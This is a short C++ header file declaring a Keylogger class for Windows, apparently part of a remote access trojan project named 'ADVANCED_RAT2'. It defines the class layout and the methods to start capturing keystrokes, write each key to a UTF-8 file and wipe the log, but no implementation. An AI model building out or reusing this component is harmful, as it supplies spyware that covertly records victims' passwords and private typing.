//
// Created by avita on 25/02/2021.
//

#ifndef ADVANCED_RAT2_KEYLOGGER_H
#define ADVANCED_RAT2_KEYLOGGER_H

#include <iostream>
#include <windows.h>
#include <string>
#include <codecvt>
#include <fstream>

using namespace std;

class Keylogger {
private:
    const locale utf8_locale = locale(locale(), new codecvt_utf8<wchar_t>());
    wofstream file;
    HWND hWindowHandle;
    BYTE *kState;
    DWORD threadId;
    HKL hkl;

public:

    Keylogger();

    void writeKeyToFile(char key);

    int startKeylogger();

    //Delete all the data in the keylogger file
    bool deleteKeyloggerData();

};


#endif //ADVANCED_RAT2_KEYLOGGER_H
